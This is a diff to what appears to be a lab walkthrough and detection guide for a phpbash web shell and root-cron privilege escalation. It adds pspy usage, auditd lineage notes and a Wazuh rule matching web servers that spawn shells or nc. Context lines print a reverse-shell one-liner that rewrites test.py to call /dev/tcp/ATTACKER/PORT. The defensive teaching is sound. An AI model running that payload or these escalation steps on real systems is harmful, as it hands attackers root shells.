@@ -79,7 +79,14 @@ sudo -u scriptmanager /bin/bash
 ls -la /scripts         # test.py (scriptmanager) + test.txt (root, rewritten each minute)
 ```
 - The minute-by-minute change to `test.txt` (owned by **root**) proves a **root cron** runs
-  `test.py` from `/scripts`. As scriptmanager you can **overwrite `test.py`**:
+  `test.py` from `/scripts`.
+- **Confirm the job without credentials — `pspy`.** `ls -la` only *infers* the cron from a changing
+  timestamp; `pspy` (a procfs process monitor that needs no root and reads `/proc` directly) lets you
+  *watch* it. Upload the static binary and run `./pspy64 -pf -i 1000`; within a minute it prints the
+  root-owned `CMD: UID=0 ... /usr/bin/python /scripts/test.py`, which is direct evidence — not a guess
+  — that a root cron executes the script you can rewrite. This is the canonical "see the scheduled task
+  you have no permission to list" move: `crontab -l` shows you only *your* jobs, so without `pspy` the
+  root cron is invisible. With the job confirmed, as scriptmanager you can **overwrite `test.py`**:
   ```
   echo 'import os; os.system("bash -c \'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\'")' > /scripts/test.py
   ```
@@ -110,8 +117,10 @@ ls -la /scripts         # test.py (scriptmanager) + test.txt (root, rewritten ea
 
 - **Apache access log:** repeated `POST`/`GET` to `/dev/phpbash.php` — an interactive web shell shows
   as a single endpoint hit many times with command-like parameters.
-- **auditd:** `www-data` running `sudo -u scriptmanager`; then a Python process spawned by **cron**
-  (`CROND` parent) running as root from `/scripts/test.py`.
+- **auditd (process lineage — the strongest foothold signal):** the web server (`apache2`) parenting an
+  interpreter (`bash`/`sh`/`python`) is the web-shell tell that survives the shell being renamed; then
+  `www-data` running `sudo -u scriptmanager`; then a Python process spawned by **cron** (`CROND` parent)
+  running as root from `/scripts/test.py`.
 - **FIM (syscheck):** modification of `/scripts/test.py` by a non-root user, immediately before a
   root-owned process runs it.
 
@@ -126,6 +135,14 @@ ls -la /scripts         # test.py (scriptmanager) + test.txt (root, rewritten ea
     <description>phpbash web shell accessed (T1505.003)</description>
     <mitre><id>T1505.003</id></mitre>
   </rule>
+  <!-- Web server process spawned an interpreter = web-shell execution (higher fidelity than the URL match) -->
+  <rule id="100522" level="12">
+    <if_group>audit_command</if_group>
+    <field name="audit.ppid_exe" type="pcre2">/(apache2|httpd|nginx)$</field>
+    <field name="audit.exe" type="pcre2">/(bash|sh|python[0-9.]*|nc)$</field>
+    <description>Web server spawned a shell/interpreter — web-shell command execution (T1505.003/T1059)</description>
+    <mitre><id>T1505.003</id><id>T1059.004</id></mitre>
+  </rule>
   <!-- A user-writable cron script changed, then run as root -->
   <rule id="100521" level="13">
     <if_group>syscheck</if_group>
@@ -135,9 +152,13 @@ ls -la /scripts         # test.py (scriptmanager) + test.txt (root, rewritten ea
   </rule>
 </group>
 ```
-**Validation:** access phpbash and confirm 100520; with `<syscheck>` watching `/scripts`, overwrite
-`test.py` and confirm 100521 before the cron tick. Sub-techniques: **T1505.003**, **T1059.004**,
-**T1548.003**, **T1053.003**.
+**Validation:** access phpbash and confirm 100520; run a command in the shell and confirm 100522 fires
+on the `apache2`→`bash`/`python` parent/child (this catches the foothold even if the shell is renamed or
+moved off `/dev/phpbash.php`, which the URL rule in 100520 would miss); with `<syscheck>` watching
+`/scripts`, overwrite `test.py` and confirm 100521 before the cron tick. The process-lineage rule (100522)
+is the higher-fidelity of the two foothold detections — a web server parenting an interpreter is almost
+never legitimate, whereas a URL signature only catches the one filename it knows. Sub-techniques:
+**T1505.003**, **T1059.004**, **T1548.003**, **T1053.003**.
 
 ## Exam relevance — Sec+ SY0-701
 
